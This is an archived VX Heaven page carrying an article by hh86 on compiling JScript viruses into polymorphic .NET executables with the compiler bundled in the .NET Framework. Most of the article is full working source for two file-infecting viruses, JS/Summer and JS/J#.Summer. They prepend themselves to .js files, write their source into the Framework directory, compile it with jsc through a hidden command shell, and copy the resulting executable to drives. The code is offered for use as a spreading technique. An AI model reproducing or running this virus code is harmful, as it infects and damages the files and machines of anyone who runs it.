<?xml version="1.0"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"><html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
<title> hh86 'Hidden in .NET' (VX heaven)</title>
<meta http-equiv="content-type" content="text/html; charset=utf-8"/>
<meta name="Author" content="hh86"/>
<meta name="KeyWords" lang="en" content="computer virus, virus, virii,vx, компьютерные вирусы, вирус, вири, hh86,Hidden in .NET, framework, jscript, virus, function, microsoft, compilers, source, file, code, running, "/>
<meta name="Description" content="Microsoft decided to include compilers along with the .NET framework that is available pretty much in every computer of the world running Windows. Compilers include one for JScript .NET. So, we can compile our JScript virus source into .NET assembly. Imagine you have polymorphic JScript virus, it is transformed to MSIL code, what is the result? One great .NET assembly that looks very different than previous one, so in each computer you can generate multiple polymorphic or even more complex instances of the virus running and spreading as exe file.This is much more powerful technique than using JS2EXE tools. ;) Since now you can infect files and recompile yourself!"/>
<script type="text/javascript">
//<![CDATA[
try{if (!window.CloudFlare) {var CloudFlare=[{verbose:0,p:0,byc:0,owlid:"cf",bag2:1,mirage2:0,oracle:0,paths:{cloudflare:"/cdn-cgi/nexp/dok3v=1613a3a185/"},atok:"047a5bcbf67431883fc9ed25fba33612",petok:"8c1e55a2c9254c3b3a99704d5d780f2a2107a450-1498756386-1800",zone:"vxheaven.org",rocket:"a",apps:{}}];document.write('<script type="text/javascript" src="//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=85b614c0f6/cloudflare.min.js"><'+'\/script>');}}catch(e){};
//]]>
</script>
<link rel="icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"/>
<link rel="stylesheet" type="text/css" href="/style.css"/><link rel="canonical" href="http://vxheaven.org/lib/vhh07.html"/>
<script type="text/rocketscript" data-rocketsrc="https://apis.google.com/js/plusone.js">{"parsetags": "explicit"}</script>
</head>
<body bgcolor="#dbc8a0" text="#302000" link="#225599" vlink="#113366">
<div class="s1">
<div style="float:right;"><a href="/lib/index.php?tbs=1"><img src="/img/max.gif" alt="Maximize"/></a></div> <form id="lf" style="margin: 0; float: right;" method="get" action="/index.php"><input type="hidden" name="action" value="set"/><select name="lang" onchange="javascript:document.getElementById('lf').submit();"><option value="ru">Русский</option><option selected="selected" value="en">English</option><option value="ua">Українська</option><option value="de">Deutsch</option><option value="es">Español</option><option value="fr">Fran&ccedil;ais</option><option value="it">Italiano</option><option value="pl">Polski</option></select></form>
<div style="float: right;"><div id="plusone"></div></div>
<script type="text/rocketscript">gapi.plusone.render("plusone", {"size":"small","count":"true"});</script>
<div style="float: right;" class="addthis_toolbox addthis_default_style">
<script type="text/rocketscript">var addthis_config = { ui_click: true }</script>
<a style="text-decoration: none; font-size: 10pt;" href="/?action=addthis" class="addthis_button_compact">Bookmark</a>
<script type="text/rocketscript" data-rocketsrc="http://s7.addthis.com/js/250/addthis_widget.js#username=herm1t"></script>
</div>
<div style="float: right;">
<script type="text/rocketscript" data-rocketsrc="http://www.google.com/cse/brand?form=cse-search-box&amp;lang=en"></script>
<form action="/search.php" id="cse-search-box">
<input type="hidden" name="cx" value="002577580816726040001:z9_irkorydo"/>
<input type="hidden" name="cof" value="FORID:10"/>
<input type="hidden" name="ie" value="UTF-8"/>
<input type="text" name="q" size="12" value=" "/>
<input type="submit" name="sa" value="Search"/>
</form>
</div><h1><a href="/" style="text-decoration: none; color: #000000;">VX Heaven</a></h1>
<span class="nav"><a href="/lib/">Library</a> <a href="/vl.php">Collection</a> <a href="/src.php">Sources</a> <a href="/vx.php?id=eidx">Engines</a> <a href="/vx.php?id=tidx">Constructors</a> <a href="/vx.php?id=sidx">Simulators</a> <a href="/vx.php?id=uidx">Utilities</a> <a href="/links.php">Links</a> <a href="/donate.php" style="color: #706020" id="donate">Donate</a> <a href="/forum" style="text-decoration: underline;">Forum</a> </span><br clear="all"/>
</div>
<div class="s2"><h1>Hidden in .NET</h1><p><a href="/lib/?lang=en&amp;author=hh86"> hh86</a><br/> <em><a href="/vx.php?fid=1943#f1943">Valhalla #1</a></em><br/> <em>August 2011</em></p><script type="text/rocketscript">var disqus_url = 'http://vxheaven.org/lib/vhh07.html';</script><div class="ci"><a href="/lib/?ci=vhh07">1</a></div>[<a style="" href="/lib/?lang=EN&amp;index=MA#vhh07">Back to index</a>] [<a href="/lib/vhh07.html#disqus_thread">Comments</a>]<br/> 
<ul>
<li><a href="#c0">.NET Compilers</a></li>
<li><a href="#c1">How hidden?</a></li>
<li><a href="#c2">How we do it</a></li>
<li><a href="#c3">JS .NET virus</a></li>
</ul>
<h2><a name="c0"></a>.NET Compilers</h2>
<p>Microsoft decided to include compilers along with the .NET framework that is available pretty much in every computer of the world running Windows. Compilers include one for JScript .NET. So, we can compile our JScript virus source into .NET assembly. Imagine you have polymorphic JScript virus, it is transformed to MSIL code, what is the result? One great .NET assembly that looks very different than previous one, so in each computer you can generate multiple polymorphic or even more complex instances of the virus running and spreading as exe file.</p>
<p>This is much more powerful technique than using JS2EXE tools. ;) Since now you can infect files and recompile yourself!</p>
<h2><a name="c1"></a>How hidden?</h2>
<p>Source code will be encoded as UTF-16LE string (no BOM present because every string is stored in this format). They are stored in the MetaData section. When running, it will use the VSA Engine to run our script. This looks like an easy way to host and run the script, however, this gets as complex as the source code is. One of the problems for me was to make a JScript file infector, how was I going to retrieve my source code? After some examination I found this, and I knew reflections must be available. JScript always had its reflection system (in part, because of the Function() object, we can create a function to be in a variable), so we don't need to open our own file and get the code, really.</p>
<h2><a name="c2"></a>How we do it</h2>
<p>We just need access to .NET Framework directory "Microsoft .NET\Framework". The detail here is there will be multiple versions of the framework. I choose to go using the last one, 4.0.</p>
<p>Here is my virus JS/Summer, <strong>must</strong> be single-line, run carefully: it spreads to fixed drives if possible.</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">function</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: #339933;">;</span>f<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Scripting.FileSystemObject&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
n<span style="color: #339933;">=</span>f.<span style="color: #660066;">GetSpecialFolder</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\\</span>Microsoft.NET<span style="color: #000099; font-weight: bold;">\\</span>Framework<span style="color: #000099; font-weight: bold;">\\</span>v4.0.30319<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><span style="color: #339933;">;</span><br/>
c<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;g();&quot;</span><span style="color: #339933;">+</span>g<span style="color: #339933;">;</span>v<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;v=[]&quot;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span>i<span style="color: #339933;">&lt;</span>c.<span style="color: #660066;">length</span><span style="color: #339933;">;</span>i<span style="color: #339933;">++</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>v<span style="color: #339933;">=</span>v<span style="color: #339933;">+</span><br/>
<span style="color: #3366CC;">&quot;;v.push(<span style="color: #000099; font-weight: bold;">\&quot;</span><span style="color: #000099; font-weight: bold;">\\</span>x&quot;</span><span style="color: #339933;">+</span>c.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span>i<span style="color: #339933;">,</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">charCodeAt</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">toString</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">16</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\&quot;</span>)&quot;</span><span style="color: black;">&#125;</span><br/>
v<span style="color: #339933;">=</span>v<span style="color: #339933;">+</span>c.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">17</span><span style="color: #339933;">,</span><span style="color: #CC0000;">51</span><span style="color: black;">&#41;</span><span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;s=f.CreateTextFile(<span style="color: #000099; font-weight: bold;">\&quot;</span>v.js<span style="color: #000099; font-weight: bold;">\&quot;</span>,2);v=v.join(<span style="color: #000099; font-weight: bold;">\&quot;</span><span style="color: #000099; font-weight: bold;">\&quot;</span>);<br/>
s.Write(v);s.Close()&quot;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>y<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>f.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #339933;">!</span>y.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>y.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>x<span style="color: #339933;">=</span>y.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>f.<span style="color: #660066;">GetExtensionName</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><br/>
<span style="color: #3366CC;">&quot;js&quot;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: #000066; font-weight: bold;">try</span><span style="color: black;">&#123;</span>b<span style="color: #339933;">=</span>f.<span style="color: #660066;">OpenTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>k<span style="color: #339933;">=</span>b.<span style="color: #660066;">Read</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>k<span style="color: #339933;">!=</span>c.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>h<span style="color: #339933;">=</span>b.<span style="color: #660066;">ReadAll</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
b.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>p<span style="color: #339933;">=</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">;</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span>l<span style="color: #339933;">=</span>f.<span style="color: #660066;">CreateTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>l.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span>c<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;;&quot;</span><span style="color: #339933;">+</span><br/>
k<span style="color: #339933;">+</span>h<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>l.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span>p<span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span>s<span style="color: #339933;">=</span>f.<span style="color: #660066;">CreateTextFile</span><span style="color: black;">&#40;</span>n<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;v&quot;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">2</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
s.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span>v<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>s.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>w<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;WScript.Shell&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">Run</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;cmd /k cd &quot;</span><span style="color: #339933;">+</span><br/>
n<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;&amp;jsc /t:winexe /fast- v&amp;exit&quot;</span><span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>y<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>f.<span style="color: #660066;">Drives</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
<span style="color: #339933;">!</span>y.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>y.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>u<span style="color: #339933;">=</span>y.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>u.<span style="color: #660066;">DriveType</span><span style="color: #339933;">==</span><span style="color: #CC0000;">1</span><span style="color: black;">&#41;</span><span style="color: black;">&#123;</span>v<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;v.exe&quot;</span><span style="color: #339933;">;</span><br/>
f.<span style="color: #660066;">CopyFile</span><span style="color: black;">&#40;</span>n<span style="color: #339933;">+</span>v<span style="color: #339933;">,</span>u<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\\</span>&quot;</span><span style="color: #339933;">+</span>v<span style="color: black;">&#41;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<h2><a name="c3"></a>JS .NET virus</h2>
<p>I thought to make an interesting cross-infector. However, we cannot know when file is certainly JScript or JScript .NET. Known bug is we cannot include the "import System;import System.IO" we require for JScript .NET. :(</p>
<p>Here is though, JS/J#.Summer:</p>
<div class="javascript" style="font-family:monospace;color: #000066;  border: solid thin #c2c1b1; background: #d6d5c5;">g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">function</span> g<span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><br/>
<span style="color: black;">&#123;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #006600; font-style: italic;">/*access source code in #US when in .NET assembly*/</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> u<span style="color: #339933;">=</span><span style="color: #3366CC;">&quot;g();&quot;</span><span style="color: #339933;">+</span>g<span style="color: #339933;">+</span><span style="color: #3366CC;">&quot;<span style="color: #000099; font-weight: bold;">\r</span><span style="color: #000099; font-weight: bold;">\n</span>&quot;</span><span style="color: #339933;">;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; s<span style="color: #339933;">=</span>GC &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black; font-style: italic;">//but it was a trick and the clock struck 12</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> f<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> ActiveXObject<span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;Scripting.FileSystemObject&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span>y<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> Enumerator<span style="color: black;">&#40;</span>f.<span style="color: #660066;">getfolder</span><span style="color: black;">&#40;</span><span style="color: #3366CC;">&quot;.&quot;</span><span style="color: black;">&#41;</span>.<span style="color: #660066;">files</span><span style="color: black;">&#41;</span><span style="color: #339933;">;!</span>y.<span style="color: #660066;">atEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>y.<span style="color: #660066;">moveNext</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> x<span style="color: #339933;">=</span>y.<span style="color: #660066;">item</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>f.<span style="color: #660066;">GetExtensionName</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span>.<span style="color: #660066;">toLowerCase</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">==</span><span style="color: #3366CC;">&quot;js&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> b<span style="color: #339933;">=</span>f.<span style="color: #660066;">OpenTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">var</span> h<span style="color: #339933;">=</span>b.<span style="color: #660066;">ReadAll</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>b.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>h.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">!=</span><span style="color: #3366CC;">&quot;g();&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> p<span style="color: #339933;">=</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">;</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span><span style="color: #CC0000;">0</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> l<span style="color: #339933;">=</span>f.<span style="color: #660066;">CreateTextFile</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>l.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span>u<span style="color: #339933;">+</span>h<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; l.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>x.<span style="color: #660066;">Attributes</span><span style="color: #339933;">=</span>p<br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">return</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<br/>
&nbsp; &nbsp; <span style="color: #006600; font-style: italic;">/*MSIL code now*/</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> w<span style="color: #339933;">,</span>s<span style="color: #339933;">=</span><span style="">Object</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> y<span style="color: #339933;">=</span>Directory.<span style="color: #660066;">GetFiles</span><span style="color: black;">&#40;</span>Directory.<span style="color: #660066;">GetCurrentDirectory</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">,</span><span style="color: #3366CC;">&quot;*.js&quot;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">for</span><span style="color: black;">&#40;</span><span style="color: #000066; font-weight: bold;">var</span> x <span style="color: #000066; font-weight: bold;">in</span> y<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; x<span style="color: #339933;">=</span>y<span style="color: black;">&#91;</span>x<span style="color: black;">&#93;</span>.<span style="color: #660066;">ToString</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">try</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; s<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> StreamReader<span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span><span style="color: #000066; font-weight: bold;">var</span> c<span style="color: #339933;">=</span>s.<span style="color: #660066;">ReadToEnd</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span>s.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">if</span><span style="color: black;">&#40;</span>c.<span style="color: #660066;">substr</span><span style="color: black;">&#40;</span><span style="color: #CC0000;">0</span><span style="color: #339933;">,</span><span style="color: #CC0000;">4</span><span style="color: black;">&#41;</span><span style="color: #339933;">!=</span><span style="color: #3366CC;">&quot;g();&quot;</span><span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">var</span> a<span style="color: #339933;">=</span>File.<span style="color: #660066;">GetAttributes</span><span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>File.<span style="color: #660066;">SetAttributes</span><span style="color: black;">&#40;</span>x<span style="color: #339933;">,</span><span style="color: #CC0000;">0</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; w<span style="color: #339933;">=</span><span style="color: #000066; font-weight: bold;">new</span> StreamWriter<span style="color: black;">&#40;</span>x<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>w.<span style="color: #660066;">Write</span><span style="color: black;">&#40;</span>u<span style="color: #339933;">+</span>c<span style="color: black;">&#41;</span><span style="color: #339933;">;</span>w.<span style="color: #660066;">Close</span><span style="color: black;">&#40;</span><span style="color: black;">&#41;</span><span style="color: #339933;">;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; File.<span style="color: #660066;">SetAttributes</span><span style="color: black;">&#40;</span>x<span style="color: #339933;">,</span>a<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: #000066; font-weight: bold;">catch</span><span style="color: black;">&#40;</span>e<span style="color: black;">&#41;</span><br/>
&nbsp; &nbsp; &nbsp; &nbsp; <span style="color: black;">&#123;</span><span style="color: black;">&#125;</span><br/>
&nbsp; &nbsp; <span style="color: black;">&#125;</span><br/>
<span style="color: black;">&#125;</span><br/>
&nbsp;</div>
<div id="disqus_thread"></div>
<script type="text/rocketscript">
        /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
        var disqus_shortname = 'vxheaven'; // required: replace example with your forum shortname

        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function() {
            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        })();
    </script>
<noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript></div>
<div><small>By accessing, viewing, downloading or otherwise using this content you agree to be bound by the <a href="/agreement.php">Terms of Use</a>!</small> <small>vxheaven.org aka vx.netlux.org</small></div>
<div style="margin-top: 2px; float: left;" class="adsapeu">
<script type="text/rocketscript">
<!--
var _acic={dataProvider:10};(function(){var e=document.createElement("script");e.type="text/javascript";e.async=true;e.src="//www.acint.net/aci.js";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)})()
//-->
</script>
</div>
<script data-rocketsrc="http://www.google-analytics.com/urchin.js" type="text/rocketscript"></script><script type="text/rocketscript">try { _uacct = "UA-590608-1"; urchinTracker(); } catch(err) {}</script>
